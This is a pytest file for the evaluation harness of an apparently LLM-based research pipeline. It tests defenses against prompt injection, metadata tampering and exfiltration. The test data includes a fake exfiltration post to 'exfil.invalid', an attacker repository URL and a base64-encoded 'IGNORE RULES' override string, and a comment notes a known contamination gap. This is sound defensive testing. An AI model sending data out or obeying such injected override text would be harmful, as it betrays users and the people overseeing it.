import json
from pathlib import Path

import pytest

from techlens.budget import digest
from techlens.evaluation import load_dataset, evaluate_sample, atomic_units
from techlens.evaluation_boundaries import CannedTransport, CannedAdapter, MARKER, graph_trace
from techlens.evaluation_models import SampleLabels
from test_evaluation import selection

DATASET = Path(__file__).resolve().parents[1] / "evals/t006/v1"


@pytest.fixture(scope="module")
def dataset():
    return load_dataset(DATASET)


@pytest.mark.parametrize("variant", ["control", "defect"])
def test_c22_actual_routes_are_separate_not_borrowed_from_local_fixture(dataset, variant):
    result = evaluate_sample(*selection(dataset, f"C22-{variant}"))
    approve, reject, denied = result.boundary_traces
    assert [t["route"] for t in result.boundary_traces] == ["approve", "reject", "budget_denial"]
    for trace in result.boundary_traces:
        assert trace["preapproval"] == {"github": 0, "search": 0, "analyzer": 0}
        assert trace["authority_unchanged"] and trace["repository_authority"]
        assert trace["unauthorized_destinations"] == []
        assert trace["layers"]["report"] == "passed"  # all real terminal reports are independently checked
    assert approve["current_round"] == 1
    assert all(approve["layers"][k] == "passed" for k in ("schema", "projection", "source_integrity", "finalization"))
    assert approve["nodes"].count("research_complete") == 1
    join = approve["nodes"].index("research_complete")
    assert approve["nodes"].index("collect_github") < join
    assert approve["nodes"].index("web_research") < join
    assert approve["nodes"].index("project_analysis") > join
    assert len([c for c in approve["calls"] if c["host"] == "search.invalid"]) == 2
    assert len([c for c in approve["calls"] if c["host"] == "analyzer.invalid"]) == 2
    assert len(approve["github_repository_urls"]) == 1
    assert reject["report_status"] == "rejected" and reject["current_round"] == 0
    assert all(c["host"] == "planner.invalid" for c in reject["calls"])
    assert denied["calls"] == [] and denied["admitted_attempts"] == 0
    assert denied["report_status"] == "partial" and denied["current_round"] == 0
    for trace in (reject, denied):
        assert trace["github_repository_urls"] == []
        for layer in ("schema", "projection", "source_integrity", "finalization"):
            assert trace["layers"][layer] == "not_exercised"
        assert "project_analysis" not in trace["nodes"]
        assert "normalize_evidence" not in trace["nodes"]


def test_c23_contamination_is_visible_not_claimed_to_be_rejected(dataset):
    good = evaluate_sample(*selection(dataset, "C23-control"))
    bad = evaluate_sample(*selection(dataset, "C23-defect"))
    assert good.boundary_traces[0]["marker_in_accepted_claims"] is False
    assert bad.boundary_traces[0]["marker_in_accepted_claims"] is True
    assert bad.assessment_outcome == "accepted" and bad.harness_expectation_met
    assert any(MARKER in c["statement"] for c in bad.claims)
    # This is the known semantic-protection gap, not evidence of a live-model attack.
    assert bad.boundary_traces[0]["unauthorized_destinations"] == []


def test_fake_transport_explicitly_rejects_unauthorized_destination():
    transport = CannedTransport()
    try:
        with pytest.raises(ValueError, match="Unauthorized fake destination"):
            transport.client.post("https://exfil.invalid/collect", json={"marker": "INERT-ONLY"})
        assert transport.denied == ["https://exfil.invalid/collect"]
        assert transport.calls == []
    finally:
        transport.close()


def test_intended_projection_is_not_exfiltration_and_labels_or_private_marker_are_not_sent(dataset):
    case, sample, label = selection(dataset, "C23-control")
    transport = CannedTransport()
    adapter = CannedAdapter(transport, "analyzer", sample.draft)
    adapter.private_test_marker = "FAKE-PRIVATE-ONLY-NOT-INPUT"
    try:
        shared = adapter.prepare(case.envelope)
        assert MARKER in json.dumps(shared)
        assert adapter.private_test_marker not in json.dumps(shared)
        assert "expected_rejection" not in json.dumps(shared)
        assert "reviewer_ids" not in json.dumps(shared)
        assert "fixture_expectation" not in json.dumps(shared)
        adapter.generate(shared)
        assert transport.calls[0]["host"] == "analyzer.invalid"
        assert transport.denied == []
        assert adapter.inputs == [case.envelope]
    finally:
        transport.close()


def test_metadata_attack_preserves_original_repository_and_deterministic_flags(dataset):
    case, sample, label = selection(dataset, "C19-control")
    assert "candidate-999" in case.source_variant.github[0].engineering_signals.repository.default_branch
    result = evaluate_sample(case, sample, label)
    trace = result.boundary_traces[0]
    assert trace["github_repository_urls"] == [str(c.repository_url) for c in case.request.candidates]
    assert trace["authority_unchanged"] and trace["repository_authority"]
    assert result.layers["report"].status == "passed"  # independently rechecks rules against source


def test_offline_graph_does_not_enable_inherited_external_tracing(dataset, monkeypatch):
    monkeypatch.setenv("LANGSMITH_TRACING", "true")
    monkeypatch.setenv("LANGCHAIN_TRACING_V2", "true")
    case, sample, _ = selection(dataset, "C22-control")
    trace = graph_trace(case, sample, "reject")
    assert trace["report_status"] == "rejected"
    assert trace["unauthorized_destinations"] == []


def rebound(case, sample, label, draft):
    units = atomic_units(draft)
    changed = sample.model_copy(update={"draft": draft, "sample_digest": digest(draft), "units": units,
        "segmentation_digest": digest([u.model_dump() for u in units])})
    labels = label.model_copy(update={"sample_digest": changed.sample_digest,
        "segmentation_digest": changed.segmentation_digest})
    return changed, labels


@pytest.mark.parametrize("mutation", ["candidate_id", "claim_id", "repository", "limits", "comparison_targets"])
def test_attack_cannot_add_application_owned_fields(dataset, mutation):
    case, sample, label = selection(dataset, "C20-control")
    draft = json.loads(json.dumps(sample.draft))
    if mutation == "candidate_id":
        draft["candidates"][0]["candidate_id"] = "candidate-999"
    elif mutation == "claim_id":
        draft["candidates"][0]["dimensions"][0]["claims"][0]["claim_id"] = "claim-999"
    elif mutation == "repository":
        draft["repository_url"] = "https://github.com/attacker/replacement"
    else:
        draft[mutation] = ["candidate-999"]
    sample, label = rebound(case, sample, label, draft)
    result = evaluate_sample(case, sample, label)
    assert result.assessment_outcome == "rejected"
    assert result.layers["boundary"].status == "blocked_by_prior_rejection"
    assert "attacker" not in str(case.request.candidates[0].repository_url)


@pytest.mark.parametrize("case_id", ["C25", "C26"])
def test_negative_controls_keep_useful_analysis(dataset, case_id):
    result = evaluate_sample(*selection(dataset, f"{case_id}-control"))
    assert result.assessment_outcome == "accepted" and len(result.claims) >= 1
    assert result.layers["boundary"].status == "passed"
    assert all(MARKER not in c["statement"] for c in result.claims)


def test_encoded_long_input_is_projected_without_decoding_or_execution(dataset):
    case, _, _ = selection(dataset, "C24-control")
    text = case.envelope["evidence"][-2]["payload"]["content"]
    assert "SUdOT1JFIFJVTEVT" in text
    assert len(text) == 1200
    assert "evidence-025" in case.projection.excerpted_evidence_ids
    assert "evidence-005" in case.projection.omitted_evidence_ids
    assert "The omitted qualifier" not in text


def test_evaluation_code_has_no_live_adapter_or_production_import_backedge():
    source = DATASET.parents[2] / "src/techlens"
    for name in ("evaluation.py", "evaluation_boundaries.py", "evaluation_models.py"):
        text = (source / name).read_text(encoding="utf-8")
        assert "OpenAI(" not in text and "TavilySearchProvider(" not in text
        assert "collect_engineering_signals(" not in text
    for path in source.glob("*.py"):
        if not path.name.startswith("evaluation"):
            assert "techlens.evaluation" not in path.read_text(encoding="utf-8")
